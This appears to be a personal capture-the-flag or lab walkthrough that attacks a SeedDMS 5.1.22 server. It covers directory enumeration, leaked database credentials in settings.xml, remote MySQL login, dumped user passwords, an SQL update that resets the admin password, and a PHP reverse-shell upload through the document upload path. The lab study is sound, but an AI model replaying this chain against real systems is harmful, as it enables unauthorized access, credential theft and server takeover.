# Enum Directory
```zsh
feroxbuster -u http://192.168.133.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,js -b 403,404
```
![](../../../Assets/Images/Pasted%20image%2020260502164935.png)
*main.js*

![](../../../Assets/Images/Pasted%20image%2020260502165052.png)
*/seeddms51x/seeddms-5.1.22/*

# Browser Access
http://192.168.133.194/seeddms51x/seeddms-5.1.22/
Redirect ↓
http://192.168.133.194/seeddms51x/seeddms-5.1.22/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms-5.1.22%2Fout%2Fout.ViewFolder.php
![](../../../Assets/Images/Pasted%20image%2020260502165447.png)

# Enum /seeddms51x/seeddms-5.1.22/ Directory
# Enum /seeddms51x/ Directory
# Enum /seeddms51x/conf/ Directory
```zsh
feroxbuster -u http://192.168.133.194/seeddms51x/conf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,js,xml -b 403,404
```
![](../../../Assets/Images/Pasted%20image%2020260502180701.png)
http://192.168.133.194/seeddms51x/conf/settings.xml

# Browser Access
![](../../../Assets/Images/Pasted%20image%2020260502180639.png)
*DB Info*
- database dbDriver="mysql" 
- dbHostname="localhost" 
- dbDatabase="seeddms" 
- dbUser="seeddms" 
- dbPass="seeddms" 
- doNotCheckVersion="false"

```zsh
mysql -h 192.168.133.194 -u seeddms -p --skip-ssl
```
![](../../../Assets/Images/Pasted%20image%2020260502183927.png)

![](../../../Assets/Images/Pasted%20image%2020260502194249.png)

![](../../../Assets/Images/Pasted%20image%2020260502194218.png)
- saket
- saurav
- Saket@#$1337

![](../../../Assets/Images/Pasted%20image%2020260502195053.png)
f9ef2c539bad8a6d2f3432b6d49ab51a

![](../../../Assets/Images/Pasted%20image%2020260502195018.png)

![](../../../Assets/Images/Pasted%20image%2020260502195217.png)

```zsh
sudo john --format=Raw-MD5 hash.txt /usr/share/wordlists/rockyou.txt
```
*I can't crack hash.*

# Change admin password.
```zsh
update tblUsers set pwd='21232f297a57a5a743894a0e4a801fc3' where login='admin';
```
![](../../../Assets/Images/Pasted%20image%2020260502202217.png)


![](../../../Assets/Images/Pasted%20image%2020260502202032.png)
*Login success.*

---
# ReverseShell
## Upload Reverseshell php file.

![](../../../Assets/Images/Pasted%20image%2020260502205030.png)

![](../../../Assets/Images/Pasted%20image%2020260502204926.png)

![](../../../Assets/Images/Pasted%20image%2020260503053450.png)
*DocumentID=4*

![](../../../Assets/Images/Pasted%20image%2020260503053819.png)
*Upload File Default Path is  /data/1048576/"document_id"/1.php*

http://192.168.133.194/seeddms51x/data/1048576/4/1.php

![](../../../Assets/Images/Pasted%20image%2020260503054050.png)
